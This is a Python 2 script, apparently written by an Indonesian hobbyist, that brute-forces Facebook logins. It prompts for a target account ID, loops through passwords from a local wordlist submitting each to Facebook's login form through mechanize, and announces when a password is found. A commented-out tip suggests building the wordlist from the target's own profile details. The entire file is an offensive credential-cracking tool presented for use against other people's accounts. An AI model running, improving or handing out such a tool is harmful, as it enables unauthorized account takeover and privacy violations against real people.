# author: Iqbalz Noobs
# Team: Life Of Programmer
# Klo gak ada passion jangan jadi programmer, koding itu berat kamu gk akan kuat...

import os
import sys
import time
import random
import cookielib
import mechanize

w = "\033[90m"
r = "\033[91m"
g = "\033[32m"
p = "\033[95;1m"
b = "\033[96m"
wl = "\033[97m"

def iqbalz(lolz):
    for noobs in lolz + '\n':
        sys.stdout.write(noobs)
        sys.stdout.flush()
        time.sleep(10. / 100)

def banner():
    os.system('clear')
    print (wl+". ")
    print (r+" _____ ____    ____             _ ")
    print ("|  ___| __ )  | __ ) _ __ _   _| |_ ___")
    print (b+"| |_  |  _ \  |  _ \| `__| | | | __/ _ \ ")
    print (wl+"|  _| | |_) | | |_) | |  | |_| | ||  __/ ")
    print (p+"|_|   |____/  |____/|_|   \__,_|\__\___|")
   # print r+" Saran penulis: Buatlah wordlist sendiri, sesuai dengan informasi yg kamu dapat dari FB target yg mau di h@ck"
    print " "
    iqbalz(b+"   L I F E  O F  P R O G R A M M E R")
    print (w+"+----------------------------------------+")
    print (w+"| \033[97mAuthor: \033[32mIqbalz Noobs")
    print (w+"| \033[97mFacebook: \033[32mIqbalzNoobs")
    print (w+"| \033[97mTeam: \033[32mLife Of Programmer")
    print (w+"| \033[97mGithub: \033[32mhttps://www.github.com/IqbalzNoobs")
    print (w+"+----------------------------------------+")

banner()
email = raw_input(r+' [\033[97m?\033[32m] Masukkan ID TARGET BOSS\033[95m:\033[96m ')
wordlist = open('pass.txt', 'r')
login = 'https://www.facebook.com/login.php?login_attempt=1'

user_noobs = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0')]

def main():
		global br
		br = mechanize.Browser()
		cj = cookielib.LWPCookieJar()
		br.set_handle_robots(False)
		br.set_handle_redirect(True)
		br.set_cookiejar(cj)
		br.set_handle_equiv(True)
		br.set_handle_referer(True)
		br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
                well()
		kintil()
def hehe(password):
		sys.stdout.write('\033[96m[\033[91m+\033[96m] \033[97mPassword SALAH GOBLOK \033[31m==> \033[90m{}'.format(password))
		sys.stdout.flush()
		br.addheaders = [('User-agent', random.choice(user_noobs))]
		site = br.open(login)
                br.select_form(nr = 0)
		br.form['email'] = email
		br.form['pass'] = password
		noobs = br.submit()
		lolz = noobs.geturl()
		if lolz != login and (not 'login_attempt' in lolz):
				print "\033[96m[#]\033[95m Login Sukses \033[96m ... {}".format(password)
                                print " "
                                print wl+"   ==[\033[92mPassword Found..->\033[91m {}\033[97m]==".format(password)
                                print " "
                                sys.exit()
def kintil():
		global password
		passwords = open('pass.txt', 'r')
		for password in passwords:
				passwords = password.replace("\n", "")
				hehe(password)

def well():
#        print wel
        print " "
        bacot = open('pass.txt', "r")
        bacot = bacot.readlines()
        print " "
        print w+"[#] AKUN TARGET : {} ".format(email)
        print "[#] JUMLAH PASSWORD:", len(bacot) 
        print "[#] TUNGGU PROSES CRACKING PASSWORD..!"
        print " "
if __name__=='__main__':
	main()
